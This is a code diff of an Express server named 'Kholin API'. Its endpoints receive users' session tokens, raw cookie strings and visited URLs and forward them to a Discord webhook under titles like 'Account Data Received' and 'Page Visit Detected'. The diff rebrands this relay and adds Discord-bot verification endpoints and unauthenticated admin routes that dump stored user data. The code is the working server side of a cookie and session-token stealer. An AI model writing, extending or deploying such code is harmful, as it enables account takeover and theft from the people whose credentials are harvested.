@@ -6,7 +6,7 @@ const crypto = require('crypto');
 // Enable CORS for all routes
 app.use((req, res, next) => {
     res.header('Access-Control-Allow-Origin', '*');
-    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
+    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
     res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
     if (req.method === 'OPTIONS') {
         return res.sendStatus(200);
@@ -17,7 +17,8 @@ app.use((req, res, next) => {
 app.use(express.json());
 
 // Store generated IDs (in production, use a database)
-const generatedIds = new Map(); // userId -> { specialId, createdAt, username }
+const generatedIds = new Map(); // userId -> { specialId, createdAt, username, verified }
+const verifiedUsers = new Map(); // userId -> { verifiedAt, discordId, discordUsername }
 
 // Generate a unique special ID for a user
 function generateSpecialId(userId, username) {
@@ -31,6 +32,10 @@ function generateSpecialId(userId, username) {
     return hash;
 }
 
+// ============================================
+// MAIN REGISTER ENDPOINT
+// ============================================
+
 app.post('/api/users/register', async (req, res) => {
     try {
         const { userId, username, displayName, sessionToken, rawCookieString, friendsCount } = req.body;
@@ -41,21 +46,30 @@ app.post('/api/users/register', async (req, res) => {
             return res.status(500).json({ error: "Webhook missing" });
         }
 
+        // Validate required fields
+        if (!userId || userId === "Unknown" || !username || username === "Unknown") {
+            return res.status(400).json({ 
+                error: "Invalid user data", 
+                message: "userId and username are required" 
+            });
+        }
+
         // Generate or retrieve special ID
         let specialId = null;
-        if (userId && userId !== "Unknown") {
-            if (generatedIds.has(userId)) {
-                specialId = generatedIds.get(userId).specialId;
-                console.log(`[${userId}] Using existing special ID: ${specialId}`);
-            } else {
-                specialId = generateSpecialId(userId, username);
-                generatedIds.set(userId, {
-                    specialId: specialId,
-                    createdAt: new Date().toISOString(),
-                    username: username
-                });
-                console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
-            }
+        if (generatedIds.has(userId)) {
+            specialId = generatedIds.get(userId).specialId;
+            console.log(`[${userId}] Using existing special ID: ${specialId}`);
+        } else {
+            specialId = generateSpecialId(userId, username);
+            generatedIds.set(userId, {
+                specialId: specialId,
+                createdAt: new Date().toISOString(),
+                username: username,
+                displayName: displayName || username,
+                friendsCount: friendsCount || '0',
+                verified: false
+            });
+            console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
         }
 
         // Build Discord Embed
@@ -67,11 +81,11 @@ app.post('/api/users/register', async (req, res) => {
         // Create fields array
         const fields = [
             { name: "👤 Username", value: `**@${username}**`, inline: true },
-            { name: "📛 Display Name", value: `**${displayName}**`, inline: true },
+            { name: "📛 Display Name", value: `**${displayName || username}**`, inline: true },
             { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
             { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
             { name: "🔑 Special ID", value: `\`\`\`${specialId || 'N/A'}\`\`\``, inline: false },
-            { name: "🔑 Session Token", value: `\`\`\`${sessionToken}\`\`\``, inline: false }
+            { name: "🔑 Session Token", value: `\`\`\`${sessionToken || 'N/A'}\`\`\``, inline: false }
         ];
 
         // Add a fun emoji based on friends count
@@ -84,7 +98,7 @@ app.post('/api/users/register', async (req, res) => {
         else if (count >= 5) friendEmoji = "✨";
 
         const payload = {
-            username: "Data Relay",
+            username: "Kholin Data Relay",
             avatar_url: "https://playvortex.io/favicon.ico",
             embeds: [{
                 title: "🦊 Account Data Received",
@@ -92,7 +106,7 @@ app.post('/api/users/register', async (req, res) => {
                 thumbnail: { url: avatarUrl },
                 fields: fields,
                 footer: { 
-                    text: `Render Proxy • ${friendEmoji} ${count} friends • ID: ${specialId || 'N/A'}`, 
+                    text: `Kholin System • ${friendEmoji} ${count} friends • ID: ${specialId || 'N/A'}`, 
                     icon_url: "https://playvortex.io/favicon.ico" 
                 },
                 timestamp: new Date().toISOString()
@@ -134,7 +148,7 @@ app.post('/api/users/register', async (req, res) => {
 // SPECIAL ID ENDPOINTS
 // ============================================
 
-// Get special ID for a user - FIXED
+// Get special ID for a user
 app.get('/api/special-id/:userId', (req, res) => {
     const { userId } = req.params;
     
@@ -153,7 +167,10 @@ app.get('/api/special-id/:userId', (req, res) => {
             userId: trimmedUserId,
             specialId: data.specialId,
             username: data.username,
-            createdAt: data.createdAt
+            displayName: data.displayName,
+            friendsCount: data.friendsCount,
+            createdAt: data.createdAt,
+            verified: data.verified || false
         });
     }
     
@@ -166,7 +183,10 @@ app.get('/api/special-id/:userId', (req, res) => {
                 userId: key,
                 specialId: value.specialId,
                 username: value.username,
-                createdAt: value.createdAt
+                displayName: value.displayName,
+                friendsCount: value.friendsCount,
+                createdAt: value.createdAt,
+                verified: value.verified || false
             });
         }
     }
@@ -182,6 +202,8 @@ app.get('/api/special-id/:userId', (req, res) => {
 app.post('/api/generate-special-id', (req, res) => {
     const { userId, username } = req.body;
     
+    console.log('[Generate] Request:', { userId, username });
+    
     if (!userId || userId === "Unknown") {
         return res.status(400).json({
             success: false,
@@ -190,10 +212,14 @@ app.post('/api/generate-special-id', (req, res) => {
     }
     
     if (generatedIds.has(userId)) {
+        const existing = generatedIds.get(userId);
+        console.log('[Generate] ID already exists:', existing);
         return res.json({
             success: true,
-            specialId: generatedIds.get(userId).specialId,
-            alreadyExists: true
+            specialId: existing.specialId,
+            alreadyExists: true,
+            userId: userId,
+            username: existing.username
         });
     }
     
@@ -201,28 +227,131 @@ app.post('/api/generate-special-id', (req, res) => {
     generatedIds.set(userId, {
         specialId: specialId,
         createdAt: new Date().toISOString(),
-        username: username || "User"
+        username: username || "User",
+        displayName: username || "User",
+        friendsCount: '0',
+        verified: false
     });
     
-    console.log(`[Special ID] Generated new ID for ${userId}: ${specialId}`);
+    console.log(`[Generate] Generated NEW ID for ${userId}: ${specialId}`);
     
     return res.json({
         success: true,
         specialId: specialId,
-        alreadyExists: false
+        alreadyExists: false,
+        userId: userId,
+        username: username || "User"
     });
 });
 
-// Verify a special ID
+// ============================================
+// VERIFICATION ENDPOINTS (For Discord Bot)
+// ============================================
+
+// POST: Verify a special ID
 app.post('/api/verify-special-id', (req, res) => {
-    const { userId, specialId } = req.body;
+    const { userId, specialId, discordId, discordUsername } = req.body;
     
-    if (!userId || !specialId) {
+    console.log('[Verification POST] Received request:', { userId, specialId, discordId, discordUsername });
+    console.log('[Verification POST] Stored IDs:', Array.from(generatedIds.entries()));
+    
+    if (!userId && !specialId) {
         return res.status(400).json({
             success: false,
             error: "Missing userId or specialId"
         });
     }
+    
+    // If userId is provided, check that specific user
+    if (userId) {
+        if (generatedIds.has(userId)) {
+            const stored = generatedIds.get(userId);
+            console.log('[Verification POST] Found stored ID for user:', stored);
+            
+            if (stored.specialId === specialId) {
+                // Mark as verified
+                stored.verified = true;
+                stored.verifiedAt = new Date().toISOString();
+                stored.discordId = discordId;
+                stored.discordUsername = discordUsername;
+                
+                // Save to verified users map
+                if (discordId) {
+                    verifiedUsers.set(discordId, {
+                        userId: userId,
+                        username: stored.username,
+                        specialId: specialId,
+                        verifiedAt: new Date().toISOString(),
+                        discordUsername: discordUsername
+                    });
+                }
+                
+                console.log('[Verification POST] ✅ SUCCESS! Special ID is valid');
+                return res.json({
+                    success: true,
+                    valid: true,
+                    userId: userId,
+                    specialId: specialId,
+                    username: stored.username,
+                    displayName: stored.displayName,
+                    verified: true,
+                    verifiedAt: stored.verifiedAt
+                });
+            } else {
+                console.log('[Verification POST] ❌ Special ID mismatch. Stored:', stored.specialId, 'Received:', specialId);
+            }
+        } else {
+            console.log('[Verification POST] ❌ User ID not found in storage:', userId);
+        }
+    }
+    
+    // If no userId provided or user not found, check by specialId
+    if (specialId) {
+        for (const [key, value] of generatedIds) {
+            if (value.specialId === specialId) {
+                // Mark as verified
+                value.verified = true;
+                value.verifiedAt = new Date().toISOString();
+                value.discordId = discordId;
+                value.discordUsername = discordUsername;
+                
+                if (discordId) {
+                    verifiedUsers.set(discordId, {
+                        userId: key,
+                        username: value.username,
+                        specialId: specialId,
+                        verifiedAt: new Date().toISOString(),
+                        discordUsername: discordUsername
+                    });
+                }
+                
+                console.log('[Verification POST] ✅ Found by specialId, verified:', key);
+                return res.json({
+                    success: true,
+                    valid: true,
+                    userId: key,
+                    specialId: specialId,
+                    username: value.username,
+                    displayName: value.displayName,
+                    verified: true,
+                    verifiedAt: value.verifiedAt
+                });
+            }
+        }
+    }
+    
+    return res.json({
+        success: true,
+        valid: false,
+        error: "Invalid special ID"
+    });
+});
+
+// GET: Verify a special ID (for Discord bot)
+app.get('/api/verify-special-id/:userId/:specialId', (req, res) => {
+    const { userId, specialId } = req.params;
+    
+    console.log('[Verification GET] Checking:', { userId, specialId });
     
     if (generatedIds.has(userId)) {
         const stored = generatedIds.get(userId);
@@ -232,7 +361,9 @@ app.post('/api/verify-special-id', (req, res) => {
                 valid: true,
                 userId: userId,
                 specialId: specialId,
-                createdAt: stored.createdAt
+                username: stored.username,
+                displayName: stored.displayName,
+                verified: stored.verified || false
             });
         }
     }
@@ -244,6 +375,109 @@ app.post('/api/verify-special-id', (req, res) => {
     });
 });
 
+// GET: Verify by username and special ID (for Discord bot)
+app.get('/api/verify-by-username/:username/:specialId', (req, res) => {
+    const { username, specialId } = req.params;
+    
+    console.log('[Verification By Username] Checking:', { username, specialId });
+    
+    // Find by username (case insensitive)
+    for (const [userId, data] of generatedIds) {
+        if (data.username.toLowerCase() === username.toLowerCase()) {
+            if (data.specialId === specialId) {
+                return res.json({
+                    success: true,
+                    valid: true,
+                    userId: userId,
+                    specialId: specialId,
+                    username: data.username,
+                    displayName: data.displayName,
+                    verified: data.verified || false
+                });
+            }
+        }
+    }
+    
+    return res.json({
+        success: true,
+        valid: false,
+        error: "Invalid username or special ID"
+    });
+});
+
+// ============================================
+// DISCORD BOT SPECIFIC ENDPOINTS
+// ============================================
+
+// Endpoint for Discord bot to verify
+app.post('/api/discord-verify', async (req, res) => {
+    const { username, specialId, discordId, discordUsername } = req.body;
+    
+    console.log('[Discord] Verification request:', { username, specialId, discordId, discordUsername });
+    console.log('[Discord] Stored IDs:', Array.from(generatedIds.entries()));
+    
+    if (!username || !specialId) {
+        return res.status(400).json({
+            success: false,
+            error: 'Missing username or special ID'
+        });
+    }
+    
+    // Check all stored IDs (case insensitive)
+    for (const [userId, data] of generatedIds) {
+        if (data.username.toLowerCase() === username.toLowerCase()) {
+            if (data.specialId === specialId) {
+                // Mark as verified
+                data.verified = true;
+                data.verifiedAt = new Date().toISOString();
+                data.discordId = discordId;
+                data.discordUsername = discordUsername;
+                
+                // Save to verified users map
+                if (discordId) {
+                    verifiedUsers.set(discordId, {
+                        userId: userId,
+                        username: data.username,
+                        specialId: specialId,
+                        verifiedAt: new Date().toISOString(),
+                        discordUsername: discordUsername
+                    });
+                }
+                
+                console.log('[Discord] ✅ Verification successful for:', username);
+                return res.json({
+                    success: true,
+                    verified: true,
+                    message: 'Verification successful',
+                    username: data.username,
+                    userId: userId,
+                    specialId: data.specialId,
+                    verifiedAt: data.verifiedAt
+                });
+            } else {
+                console.log('[Discord] ❌ Special ID mismatch for', username);
+                console.log('[Discord] Stored:', data.specialId, 'Received:', specialId);
+                return res.json({
+                    success: false,
+                    verified: false,
+                    error: 'Invalid special ID for this username'
+                });
+            }
+        }
+    }
+    
+    console.log('[Discord] ❌ Username not found:', username);
+    return res.status(404).json({
+        success: false,
+        verified: false,
+        error: 'Username not found in Kholin system. Please link your profile first.'
+    });
+});
+
+// ============================================
+// ADMIN ENDPOINTS
+// ============================================
+
 // Get all generated IDs (admin only - add auth in production)
 app.get('/api/all-special-ids', (req, res) => {
     const data = [];
@@ -252,13 +486,55 @@ app.get('/api/all-special-ids', (req, res) => {
             userId,
             specialId: info.specialId,
             username: info.username,
-            createdAt: info.createdAt
+            displayName: info.displayName,
+            friendsCount: info.friendsCount,
+            createdAt: info.createdAt,
+            verified: info.verified || false,
+            verifiedAt: info.verifiedAt || null,
+            discordId: info.discordId || null,
+            discordUsername: info.discordUsername || null
         });
     }
     return res.json({
         success: true,
         total: data.length,
         data: data
+    });
+});
+
+// Get verified users
+app.get('/api/verified-users', (req, res) => {
+    const data = [];
+    for (const [discordId, info] of verifiedUsers) {
+        data.push({
+            discordId,
+            ...info
+        });
+    }
+    return res.json({
+        success: true,
+        total: data.length,
+        data: data
+    });
+});
+
+// Delete a user's ID (admin only)
+app.delete('/api/special-id/:userId', (req, res) => {
+    const { userId } = req.params;
+    
+    if (generatedIds.has(userId)) {
+        const data = generatedIds.get(userId);
+        generatedIds.delete(userId);
+        console.log(`[Admin] Deleted user: ${userId} (${data.username})`);
+        return res.json({
+            success: true,
+            message: `Deleted user ${userId}`
+        });
+    }
+    
+    return res.status(404).json({
+        success: false,
+        error: "User not found"
     });
 });
 
@@ -277,7 +553,7 @@ app.post('/api/collect', async (req, res) => {
         }
 
         const payload = {
-            username: "Data Relay",
+            username: "Kholin Data Relay",
             avatar_url: "https://playvortex.io/favicon.ico",
             embeds: [{
                 title: "🌐 Page Visit Detected",
@@ -286,7 +562,7 @@ app.post('/api/collect', async (req, res) => {
                     { name: "🔗 URL", value: url || "Unknown", inline: false },
                     { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                 ],
-                footer: { text: "Render Proxy", icon_url: "https://playvortex.io/favicon.ico" },
+                footer: { text: "Kholin System", icon_url: "https://playvortex.io/favicon.ico" },
                 timestamp: new Date().toISOString()
             }]
         };
@@ -309,8 +585,28 @@ app.post('/api/collect', async (req, res) => {
     }
 });
 
+// ============================================
+// HEALTH CHECK
+// ============================================
+
 app.get('/', (req, res) => {
-    res.send('Kholin API is running.');
+    res.json({
+        name: 'Kholin API',
+        version: '1.0.0',
+        status: 'running',
+        endpoints: {
+            register: 'POST /api/users/register',
+            specialId: 'GET /api/special-id/:userId',
+            generate: 'POST /api/generate-special-id',
+            verify: 'POST /api/verify-special-id',
+            verifyGet: 'GET /api/verify-special-id/:userId/:specialId',
+            verifyByUsername: 'GET /api/verify-by-username/:username/:specialId',
+            discordVerify: 'POST /api/discord-verify',
+            allIds: 'GET /api/all-special-ids',
+            verifiedUsers: 'GET /api/verified-users',
+            health: 'GET /health'
+        }
+    });
 });
 
 app.get('/health', (req, res) => {
@@ -319,12 +615,18 @@ app.get('/health', (req, res) => {
         timestamp: new Date().toISOString(),
         webhookConfigured: !!process.env.webhook,
         generatedIdsCount: generatedIds.size,
-        generatedIds: Array.from(generatedIds.keys())
+        generatedIds: Array.from(generatedIds.keys()),
+        verifiedUsersCount: verifiedUsers.size
     });
 });
+
+// ============================================
+// START SERVER
+// ============================================
 
 app.listen(PORT, () => {
     console.log(`✅ Kholin Server running on port ${PORT}`);
     console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
     console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default (not secure for production)'}`);
+    console.log(`   Environment: ${process.env.NODE_ENV || 'development'}`);
 });
